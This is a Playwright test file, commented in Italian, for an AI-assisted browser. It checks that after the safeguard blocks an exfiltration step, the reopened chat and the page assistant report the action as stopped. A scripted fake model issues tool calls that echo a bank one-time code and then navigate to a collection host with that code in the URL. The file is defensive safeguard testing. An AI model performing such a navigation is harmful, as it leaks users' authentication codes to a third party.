// Verifica #810, giro 5, rilievo 2: dopo un blocco, chi racconta dopo non sa che l'azione è stata
// fermata. La chat riaperta dice di aver aperto la pagina; l'assistente di pagina non lo sa.

import { test, expect } from '../../fixtures/electron.mjs';
import {
  CODICE, RACCOLTA, apertoVerso, preparaModelli, modelloFinto, apriAiuto, scriviAllAiuto, newtab,
  NAVIGA_COL_CODICE, esitoUscita,
} from './aiuti.mjs';

async function senzaAccoglienza(app, page) {
  await app.evaluate(async () => {
    const M = globalThis.SN_FILO_MEMORY;
    await M.setOnboarding(globalThis.SN_ONBOARDING.close(await M.getOnboarding()));
  });
  await page.reload();
  await expect(page.locator('#input')).toBeVisible();
}

test('riaperta dalla Cronologia, la chat non racconta come aperta la pagina che aveva fermato', async ({ app, shell, openTab }) => {
  test.setTimeout(90_000);
  await expect(shell.locator('.tab')).toHaveCount(1, { timeout: 8_000 });
  const page = await newtab(app);
  await preparaModelli(app);
  await senzaAccoglienza(app, page);
  await modelloFinto(app, {
    giri: [
      { toolCalls: [{ id: 'c1', name: 'ESEGUI_COMANDO', arguments: JSON.stringify({ comando: `echo "Il tuo codice monouso è ${CODICE}"` }) }] },
      { toolCalls: [{ id: 'n1', name: 'NAVIGA', arguments: JSON.stringify({ url: `https://${RACCOLTA}/c?v=${CODICE}` }) }] },
      { text: 'Fatto quello che potevo.' },
    ],
  });
  await page.locator('#input').fill('leggi la notifica della banca');
  await page.locator('#sendBtn').click();
  await expect(page.locator('.dash-bubble-filo', { hasText: 'Fatto quello' })).toBeVisible({ timeout: 20_000 });
  await expect(page.locator('.dash-activity .dash-activity-label').last()).toContainText("fermato un'azione");
  expect(apertoVerso(app, RACCOLTA)).toBe(false);

  let id = null;
  await expect.poll(async () => {
    id = await page.evaluate(async () => {
      const r = await chrome.runtime.sendMessage({ type: 'filo_chats_list' });
      for (const c of (r && r.chats) || []) {
        const g = await chrome.runtime.sendMessage({ type: 'filo_chat_get', id: c.id });
        if (JSON.stringify((g && g.chat) || {}).includes('Fatto quello')) return c.id;
      }
      return null;
    });
    return id;
  }, { timeout: 10_000 }).toBeTruthy();
  await openTab(`filo://dashboard/dashboard.html?chat=${encodeURIComponent(id)}`);
  const riaperta = await newtab(app, 'filo://dashboard/dashboard.html?chat=');
  await expect(riaperta.locator('.dash-bubble-filo', { hasText: 'Fatto quello' })).toBeVisible({ timeout: 10_000 });
  await expect(riaperta.locator('.dash-bubble-note[data-replay]').first()).toBeVisible({ timeout: 10_000 });
  const nota = (await riaperta.locator('.dash-bubble-note[data-replay]').allInnerTexts()).join(' | ');
  expect(nota, 'la chat riaperta dice di aver aperto la pagina fermata').not.toContain('aperto una pagina');
  expect(nota).toContain('fermato');
});

test('dopo un indirizzo fermato, l’assistente di pagina sa che non si è aperto', async ({ app, shell, openTab, testServer }) => {
  test.setTimeout(60_000);
  const page = await testServer.openReady(openTab, `<!doctype html><html><head><title>Banca</title></head>
    <body><p>Il tuo codice monouso è ${CODICE}.</p></body></html>`);
  await preparaModelli(app);
  await modelloFinto(app, { aiuto: [['l’hai aperta', JSON.stringify({ text: 'Rispondo.', status: 'done' })], ['', NAVIGA_COL_CODICE]] });
  await apriAiuto(shell, page);
  await scriviAllAiuto(page, 'aiutami a finire l’accesso');
  expect(await esitoUscita(app, page)).toBe('fermato');
  await scriviAllAiuto(page, 'l’hai aperta?');
  await expect.poll(() => app.evaluate(() => globalThis.__visti.length), { timeout: 20_000 }).toBeGreaterThan(1);
  const visti = await app.evaluate(() => globalThis.__visti);
  const storia = JSON.stringify(visti[visti.length - 1].filter((m) => m.role !== 'system'));
  expect(storia, 'il modello non sa che l’indirizzo è stato fermato')
    .toMatch(/non ho aperto|non è stat[oa] apert|NON eseguit|bloccat[oa]\b|fermat[oa]\b/i);
});
